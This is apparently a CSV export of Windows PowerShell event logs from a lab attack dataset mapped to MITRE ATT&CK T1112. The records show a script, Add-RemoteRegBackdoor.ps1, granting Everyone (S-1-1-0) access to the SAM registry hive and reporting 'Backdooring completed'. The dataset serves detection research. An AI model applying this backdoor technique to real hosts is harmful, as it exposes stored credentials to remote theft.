Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SAM\SAM\Domains\Account] Backdooring completed for key"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1132,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SAM\\SAM\\Domains\\Account] Backdooring completed for key\"", ""}]}}"
127,68961,2021-12-09 19:54:03.6506374,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1134,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1134,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03] Backdooring completed for system"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1134,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03] Backdooring completed for system\"", ""}]}}"
128,68962,2021-12-09 19:54:03.6662609,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1136,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: New-Object,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1136,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(New-Object): ""New-Object"", ParameterBinding(New-Object): name=""TypeName""; value=""PSObject"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1136,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(New-Object): \""New-Object\"", ParameterBinding(New-Object): name=\""TypeName\""; value=\""PSObject\"", ""}]}}"
129,68963,2021-12-09 19:54:03.6662609,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Add-Member,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1138,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Add-Member,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Add-Member,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1138,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Add-Member): ""Add-Member"", ParameterBinding(Add-Member): name=""MemberType""; value=""NoteProperty"", ParameterBinding(Add-Member): name=""Name""; value=""ComputerName"", ParameterBinding(Add-Member): name=""Value""; value=""FS03"", ParameterBinding(Add-Member): name=""InputObject""; value="""", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Add-Member,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1138,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Add-Member): \""Add-Member\"", ParameterBinding(Add-Member): name=\""MemberType\""; value=\""NoteProperty\"", ParameterBinding(Add-Member): name=\""Name\""; value=\""ComputerName\"", ParameterBinding(Add-Member): name=\""Value\""; value=\""FS03\"", ParameterBinding(Add-Member): name=\""InputObject\""; value=\""\"", ""}]}}"
130,68964,2021-12-09 19:54:03.6662609,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Add-Member,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1140,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Add-Member,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Add-Member,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1140,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Add-Member): ""Add-Member"", ParameterBinding(Add-Member): name=""MemberType""; value=""NoteProperty"", ParameterBinding(Add-Member): name=""Name""; value=""BackdoorTrustee"", ParameterBinding(Add-Member): name=""Value""; value=""S-1-1-0"", ParameterBinding(Add-Member): name=""InputObject""; value=""@{ComputerName=FS03}"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Add-Member,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1140,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Add-Member): \""Add-Member\"", ParameterBinding(Add-Member): name=\""MemberType\""; value=\""NoteProperty\"", ParameterBinding(Add-Member): name=\""Name\""; value=\""BackdoorTrustee\"", ParameterBinding(Add-Member): name=\""Value\""; value=\""S-1-1-0\"", ParameterBinding(Add-Member): name=\""InputObject\""; value=\""@{ComputerName=FS03}\"", ""}]}}"
131,68965,2021-12-09 19:54:03.6662609,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = ,         Command Type = Script,         Script Name = ,         Command Path = ,         Sequence Number = 1142,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,"Command Name: ",Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"Script Name: ","ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = ,         Command Type = Script,         Script Name = ,         Command Path = ,         Sequence Number = 1142,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Out-Default): ""Out-Default"", ParameterBinding(Out-Default): name=""InputObject""; value=""@{ComputerName=FS03; BackdoorTrustee=S-1-1-0}"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = ,         Command Type = Script,         Script Name = ,         Command Path = ,         Sequence Number = 1142,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Out-Default): \""Out-Default\"", ParameterBinding(Out-Default): name=\""InputObject\""; value=\""@{ComputerName=FS03; BackdoorTrustee=S-1-1-0}\"", ""}]}}"
132,68966,2021-12-09 19:54:03.6662609,4104,Verbose,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Contains contents of scripts run,,,"Path: ",ScriptBlockText: prompt,,,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""MessageNumber"",""#text"":""1""},{""@Name"":""MessageTotal"",""#text"":""1""},{""@Name"":""ScriptBlockText"",""#text"":""prompt""},{""@Name"":""ScriptBlockId"",""#text"":""e85ddc7a-38dc-415f-87e9-392f96510932""}]}}"
